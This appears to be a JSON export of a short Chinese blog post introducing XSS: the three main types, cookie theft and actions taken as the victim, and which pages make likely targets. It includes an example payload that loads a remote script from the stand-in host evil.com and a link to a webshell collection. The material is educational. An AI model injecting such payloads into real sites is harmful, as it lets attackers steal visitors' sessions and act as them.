{"title":"XSS基础","uid":"2ae9b590ca3c1c2667fd185e3a54758c","slug":"XSS基础","date":"2022-02-20T13:42:18.000Z","updated":"2022-05-30T14:42:10.426Z","comments":true,"path":"api/articles/XSS基础.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>XSS跨站脚本攻击：<br><img src=\"/post/XSS%E5%9F%BA%E7%A1%80.htm/image-20220220215531776.png\" alt=\"image-20220220215531776\"></p>\n<h2 id=\"XSS原理\"><a href=\"#XSS原理\" class=\"headerlink\" title=\"XSS原理\"></a>XSS原理</h2><p>恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。属于前端漏洞。</p>\n<p>（若有与对方交互的地方，就可能会有攻击点）</p>\n<h2 id=\"XSS分类\"><a href=\"#XSS分类\" class=\"headerlink\" title=\"XSS分类\"></a>XSS分类</h2><p>1、反射型（非持久型）：通过在页面上植入恶意链接，诱使用户点击，执行js脚本，所谓反射型XSS就是将用户输入的数据（恶意用户输入的js脚本），“反射”到浏览器执行。</p>\n<p>2、存储型（持久型）：此类XSS漏洞是指，用户输入的数据（恶意代码）可以“存储”在服务端，只要有人访问这个包含有存储型XSS代码的页面，XSS脚本就会在他们的浏览器中执行，这种XSS具有很强的稳定性。所以也被称做，“持久型XSS”。</p>\n<p>3、DOM型：它和前两种的区别在于，DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情。</p>\n<p>DOM型常见输入点：<br>document.location（以及location的多个属性）</p>\n<p>document.referrer</p>\n<p>document.cookie</p>\n<p><strong>Document 对象</strong>：每个载入浏览器的 HTML 文档都会成为 Document 对象。</p>\n<p>Document 对象使我们可以从脚本中对 HTML 页面中的所有元素进行访问。</p>\n<h2 id=\"XSS-“跨站脚本”重要的是脚本\"><a href=\"#XSS-“跨站脚本”重要的是脚本\" class=\"headerlink\" title=\"XSS-“跨站脚本”重要的是脚本\"></a>XSS-“跨站脚本”重要的是脚本</h2><p>跨站脚本的重点不在“跨站”上，而应该在“脚本”上。“跨”是属于浏览器的特性，而不是缺陷，造成“跨”这样的假象是因为绝大多数XSS攻击都会采用嵌入一段远程或者说第三方域上的脚本资源，由于任何安全问题都存在“输入”的概念，很多时候输入的内容是有限制的。真正的XSS攻击弹出窗毫无意义，所以攻击代码可能会比较长，一般会注入类似下面的代码来引用第三方域上的脚本资源：</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token operator\">&lt;</span>script src<span class=\"token operator\">=</span><span class=\"token string\">\"http://www.evil.com/xss.js\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这样的好处就是：代码容易控制。对于上面的例子，虽然<code>xss.js</code>的文件资源在<code>www.evil.com</code>上，但脚本内容却属于嵌入对象所在的浏览器上下文环境中。换句话说：人在你那里，但是心在我这里，战场就在我这里。既然战场在我这里，怎么玩那就是脚本的事了，脚本中实现任何想要的功能。比如：盗取用户身份认证信息，篡改用户数据等。</p>\n<h2 id=\"XSS常规攻击手法\"><a href=\"#XSS常规攻击手法\" class=\"headerlink\" title=\"XSS常规攻击手法\"></a>XSS常规攻击手法</h2><p>1、盗用cookie，获取敏感信息。</p>\n<p>2、利用植入Flash，通过crossdomain权限设置进一步获取更高权限;或者利用Java等得到类似的操作。</p>\n<p>3、利用iframe、frame、或上述Flash等方式，以用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</p>\n<p>4、利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</p>\n<p>5、在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDos攻击的效果。</p>\n<p>例：</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>“hey<span class=\"token operator\">!</span>you are attacked”<span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n\n\n<h2 id=\"XSS常用场景\"><a href=\"#XSS常用场景\" class=\"headerlink\" title=\"XSS常用场景\"></a>XSS常用场景</h2><p>由于XSS漏洞只有通过触发脚本语句才会执行，并且XSS漏洞的限制很多，代码触发不了XSS漏洞也就利用不了。而运用最多的地方，<strong>例如：留言板，订单页面等等</strong>，管理员经常查看的页面才有很大的成功率会触发XSS漏洞。这也表示XSS漏洞的限制很大。</p>\n<h2 id=\"用户凭据\"><a href=\"#用户凭据\" class=\"headerlink\" title=\"用户凭据\"></a>用户凭据</h2><p>用户凭据：通过凭据可以判断对方身份信息</p>\n<p>cookie：存储在本地，存活时间长，小中型网站</p>\n<p>session：会话，存储在服务器，存活时间较短，大型网站</p>\n<p><strong>webshell工具</strong></p>\n<p><a href=\"https://github.com/tennc/webshell\">https://github.com/tennc/webshell</a></p>\n","text":"前言XSS跨站脚本攻击： XSS原理恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。属于前端漏洞。 （若有与对方交互的地方，就可能会有攻击点） XSS分类1、反射型（非持...","link":"","photos":[],"count_time":{"symbolsCount":"1.6k","symbolsTime":"1 mins."},"categories":[{"name":"xss","slug":"xss","count":4,"path":"api/categories/xss.json"}],"tags":[{"name":"xss","slug":"xss","count":4,"path":"api/tags/xss.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XSS%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">XSS原理</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XSS%E5%88%86%E7%B1%BB\"><span class=\"toc-text\">XSS分类</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XSS-%E2%80%9C%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E2%80%9D%E9%87%8D%E8%A6%81%E7%9A%84%E6%98%AF%E8%84%9A%E6%9C%AC\"><span class=\"toc-text\">XSS-“跨站脚本”重要的是脚本</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XSS%E5%B8%B8%E8%A7%84%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95\"><span class=\"toc-text\">XSS常规攻击手法</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XSS%E5%B8%B8%E7%94%A8%E5%9C%BA%E6%99%AF\"><span class=\"toc-text\">XSS常用场景</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE\"><span class=\"toc-text\">用户凭据</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"xss跨站-xss-labs","uid":"b564e09de39e303e8a190e6bd2a14088","slug":"xss跨站-xss-labs","date":"2022-02-21T14:58:27.000Z","updated":"2022-05-30T14:43:32.587Z","comments":true,"path":"api/articles/xss跨站-xss-labs.json","keywords":null,"cover":[],"text":"[TOC] 前言记录一下xss靶场，xss-labs通关过程。 ##Level-1（无过滤） ###0x00 可以看到给的提示是payload长度为4，地址栏中get方式的name&#x3D;test与欢迎用户test相对应，试着改一下name的参数值。 0x01修改为test&...","link":"","photos":[],"count_time":{"symbolsCount":"7.3k","symbolsTime":"7 mins."},"categories":[{"name":"xss","slug":"xss","count":4,"path":"api/categories/xss.json"}],"tags":[{"name":"靶场","slug":"靶场","count":12,"path":"api/tags/靶场.json"},{"name":"xss","slug":"xss","count":4,"path":"api/tags/xss.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"文件上传-WAF绕过","uid":"07ba4ec78c8c1a3bf9ee409d03b686e2","slug":"文件上传-WAF绕过","date":"2022-02-18T07:45:11.000Z","updated":"2022-02-18T12:25:50.391Z","comments":true,"path":"api/articles/文件上传-WAF绕过.json","keywords":null,"cover":null,"text":"前言由于在真实环境当中，网站会有相应的软件防护，通常发现文件上传漏洞后还要进行WAF绕过，而类似的防护软件有safedog，BT等，所以需要了解防护的规则并且绕过防护。 当然，这里的WAF绕过是广义上的，不单单是指防护软件，类似前后端源码的防护规则也需要进行WAF绕过。 上传参数...","link":"","photos":[],"count_time":{"symbolsCount":"1.2k","symbolsTime":"1 mins."},"categories":[{"name":"文件上传","slug":"文件上传","count":5,"path":"api/categories/文件上传.json"}],"tags":[{"name":"文件上传","slug":"文件上传","count":7,"path":"api/tags/文件上传.json"},{"name":"Bypass WAF","slug":"Bypass-WAF","count":7,"path":"api/tags/Bypass-WAF.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}